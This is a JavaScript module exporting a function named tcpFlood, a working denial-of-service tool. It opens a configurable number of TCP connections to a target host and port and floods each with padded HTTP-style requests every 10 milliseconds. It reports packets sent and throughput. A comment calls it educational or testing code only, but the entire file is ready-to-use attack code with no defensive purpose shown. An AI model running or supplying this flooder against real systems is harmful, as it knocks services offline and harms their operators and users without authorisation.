import net from 'net';

/**
 * Performs a TCP flood attack on a target. This function is intended for educational/testing purposes ONLY.
 * Using this function against systems without explicit permission is illegal and unethical.
 *
 * @param {string} target The target hostname or IP address.
 * @param {number} port The target port. Defaults to 80.
 * @param {number} threads The number of concurrent TCP connections to establish. Defaults to 10.
 * @param {number} duration The duration of the flood in seconds. Defaults to 60.
 * @param {function} statusCallback A callback function to update the status.
 */
async function tcpFlood(target, port = 80, threads = 10, duration = 60, statusCallback = null) {
  if (!target) {
    console.error("Target hostname or IP address is required for TCP flood.");
    if (statusCallback) statusCallback({ status: 'error', message: 'Target is required.' });
    return;
  }

  if (!Number.isInteger(port) || port <= 0 || port > 65535) {
    console.warn("Port must be a valid integer between 1 and 65535. Using default value of 80.");
    port = 80;
  }

  if (threads <= 0) {
    console.warn("Number of threads must be greater than 0. Using default value of 10.");
    threads = 10;
  }

  if (duration <= 0) {
    console.warn("Duration must be greater than 0. Using default value of 60 seconds.");
    duration = 60;
  }

  console.log(`Starting TCP flood attack on ${target}:${port} with ${threads} threads for ${duration} seconds.`);
  if (statusCallback) statusCallback({ status: 'starting', message: `Starting TCP flood on ${target}:${port}` });

  let sockets = [];
  let startTime = Date.now();
  let floodActive = true;
  let packetsSent = 0;
  let intervalIds = [];
  let bytesSent = 0;

  function removeSocket(socket, index) {
    if (index > -1) {
      sockets.splice(index, 1);
    }
    try {
      socket.destroy();
    } catch (e) {
      console.error("Error destroying socket:", e);
    }
  }

  for (let i = 0; i < threads; i++) {
    if (!floodActive) break;

    try {
      const socket = net.createConnection({ host: target, port: port }, () => {
        if (!floodActive) {
          socket.destroy();
          return;
        }
        console.log(`Thread ${i + 1}: Connected to ${target}:${port}`);
        if (statusCallback) statusCallback({ status: 'thread_connected', thread: i + 1 });

        sockets.push(socket);

        const intervalId = setInterval(() => {
          if (!floodActive) {
            clearInterval(intervalId);
            removeSocket(socket, sockets.indexOf(socket));
            return;
          }

          try {
            let payload = "GET / HTTP/1.1\r\n" +
              "Host: " + target + "\r\n" +
              "Connection: keep-alive\r\n" +
              "User-Agent: NoodlesBot\r\n" +
              "Cache-Control: no-cache\r\n" +
              "Accept-Encoding: gzip, deflate, br\r\n" +
              "X-Filler: " + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + "\r\n" +
              "\r\n";

            const randomData = Math.random().toString(36).repeat(500);
            payload += randomData;

            socket.write(payload);
            packetsSent++;
            bytesSent += payload.length;

            const elapsedTime = (Date.now() - startTime) / 1000;
            const mbps = (bytesSent / 1000000) / elapsedTime;

            if (statusCallback) {
              statusCallback({
                status: 'packet_sent',
                packets: packetsSent,
                mbps: mbps.toFixed(2)
              });
            }

          } catch (err) {
            console.error(`Thread ${i + 1}: Error sending data: ${err.message}`);
            if (statusCallback) statusCallback({ status: 'thread_error', thread: i + 1, error: err.message });
            clearInterval(intervalId);
            removeSocket(socket, sockets.indexOf(socket));
          }
        }, 10);

        intervalIds.push(intervalId);

        setTimeout(() => {
          console.log(`Thread ${i + 1}: Closing connection after ${duration} seconds.`);
          clearInterval(intervalId);
          removeSocket(socket, sockets.indexOf(socket));
          if (statusCallback) statusCallback({ status: 'thread_closed', thread: i + 1 });
        }, duration * 1000);
      });

      socket.on('error', (err) => {
        console.error(`Thread ${i + 1}: Socket error: ${err.message}`);
        if (statusCallback) statusCallback({ status: 'socket_error', thread: i + 1, error: err.message });
        clearInterval(intervalIds[i]);
        removeSocket(socket, sockets.indexOf(socket));
      });

      socket.on('close', () => {
        console.log(`Thread ${i + 1}: Connection closed.`);
        removeSocket(socket, sockets.indexOf(socket));
        if (statusCallback) statusCallback({ status: 'connection_closed', thread: i + 1 });
      });

    } catch (socketError) {
      console.error(`Error creating socket for thread ${i + 1}:`, socketError);
      if (statusCallback) statusCallback({ status: 'socket_creation_error', thread: i + 1, error: socketError.message });
    }
  }

  setTimeout(() => {
    console.log("Stopping TCP flood.");
    floodActive = false;
    intervalIds.forEach(intervalId => clearInterval(intervalId));
    sockets.forEach((socket, index) => {
      removeSocket(socket, index);
    });
    if (statusCallback) statusCallback({ status: 'flood_stopped', packets: packetsSent });
  }, duration * 1000);
}

export { tcpFlood };